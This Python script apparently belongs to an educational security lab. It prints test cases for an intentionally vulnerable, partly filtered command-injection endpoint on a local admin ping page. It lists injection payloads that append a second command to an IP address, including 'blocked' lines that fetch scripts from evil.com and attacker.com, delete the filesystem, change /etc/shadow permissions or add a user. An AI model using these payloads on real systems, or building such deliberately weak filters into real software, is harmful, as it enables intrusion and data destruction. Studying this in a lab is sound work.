#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
制限付きコマンドインジェクション機能のテスト
"""

import urllib.parse

def test_command_filtering():
    print("🔍 制限付きコマンドインジェクション機能テスト")
    print("=" * 60)
    
    base_url = "http://localhost:5000/admin/system?target="
    
    print("\n✅ 許可されるコマンド (研究用):")
    print("=" * 50)
    
    allowed_payloads = [
        ("127.0.0.1 & dir", "ディレクトリ一覧表示"),
        ("127.0.0.1; ls -la", "ファイル詳細一覧"),
        ("127.0.0.1 && whoami", "現在のユーザー名"),
        ("127.0.0.1 | id", "ユーザーID情報"),
        ("127.0.0.1; pwd", "現在のディレクトリ"),
        ("127.0.0.1 & echo Hello", "文字列出力"),
        ("127.0.0.1; date", "現在の日時"),
        ("127.0.0.1 && hostname", "ホスト名表示"),
        ("127.0.0.1 | systeminfo", "システム情報"),
        ("127.0.0.1; uname -a", "システム詳細情報"),
        ("127.0.0.1 & ps", "プロセス一覧"),
        ("127.0.0.1; cat /etc/hostname", "ホスト名ファイル"),
        ("127.0.0.1 && find /tmp -name '*.txt'", "ファイル検索"),
        ("127.0.0.1 | grep ping", "文字列検索")
    ]
    
    for i, (payload, description) in enumerate(allowed_payloads, 1):
        encoded = urllib.parse.quote(payload)
        print(f"{i:2d}. {payload}")
        print(f"    説明: {description}")
        print(f"    URL: {base_url}{encoded}")
        print(f"    結果: ✅ 実行許可")
        print()
    
    print("\n❌ ブロックされるコマンド (危険):")
    print("=" * 50)
    
    blocked_payloads = [
        ("127.0.0.1 & rm -rf /", "ファイル削除"),
        ("127.0.0.1; del C:\\*", "ファイル削除"),
        ("127.0.0.1 && python -c 'import os;os.system(\"calc\")'", "Python実行"),
        ("127.0.0.1 | curl http://evil.com/shell.sh", "外部スクリプト取得"),
        ("127.0.0.1; wget http://attacker.com/payload", "ファイルダウンロード"),
        ("127.0.0.1 & powershell -c Get-Process", "PowerShell実行"),
        ("127.0.0.1; bash -c 'rm /etc/passwd'", "シェル実行"),
        ("127.0.0.1 && kill -9 1", "プロセス強制終了"),
        ("127.0.0.1 | shutdown -h now", "システム停止"),
        ("127.0.0.1; chmod 777 /etc/shadow", "権限変更"),
        ("127.0.0.1 & net user hacker pass123 /add", "ユーザー追加"),
        ("127.0.0.1; mount /dev/sda1 /mnt", "ファイルシステムマウント"),
        ("127.0.0.1 && certutil -urlcache", "証明書ユーティリティ"),
        ("127.0.0.1 | msiexec /i payload.msi", "インストーラ実行")
    ]
    
    for i, (payload, description) in enumerate(blocked_payloads, 1):
        encoded = urllib.parse.quote(payload)
        print(f"{i:2d}. {payload}")
        print(f"    説明: {description}")
        print(f"    URL: {base_url}{encoded}")
        print(f"    結果: ❌ ブロック")
        print()
    
    print("\n🎯 実装の特徴:")
    print("=" * 50)
    features = [
        "✅ ホワイトリスト方式でコマンド制限",
        "✅ 危険なコマンドのブラックリスト",
        "✅ パス実行の防止",
        "✅ スクリプト言語の実行防止",
        "✅ ネットワークコマンドの制限",
        "✅ システム変更コマンドのブロック",
        "✅ Pingテスト機能としての正当性維持",
        "✅ 研究目的の情報収集コマンドは許可"
    ]
    
    for feature in features:
        print(feature)
    
    print("\n🔒 セキュリティバランス:")
    print("=" * 50)
    print("🟢 正当な機能: Pingテスト (SSRF研究可能)")
    print("🟡 制限付き脆弱性: 基本的な情報収集のみ")
    print("🔴 危険な操作: 完全ブロック")
    print("🎓 教育目的: コマンドインジェクションの理解")
    
    print("\n📊 実際のテスト例:")
    print("=" * 50)
    test_cases = [
        "google.com & dir",
        "8.8.8.8; whoami", 
        "localhost && ls",
        "127.0.0.1 | echo test"
    ]
    
    for test in test_cases:
        encoded = urllib.parse.quote(test)
        print(f"• {base_url}{encoded}")

if __name__ == "__main__":
    test_command_filtering()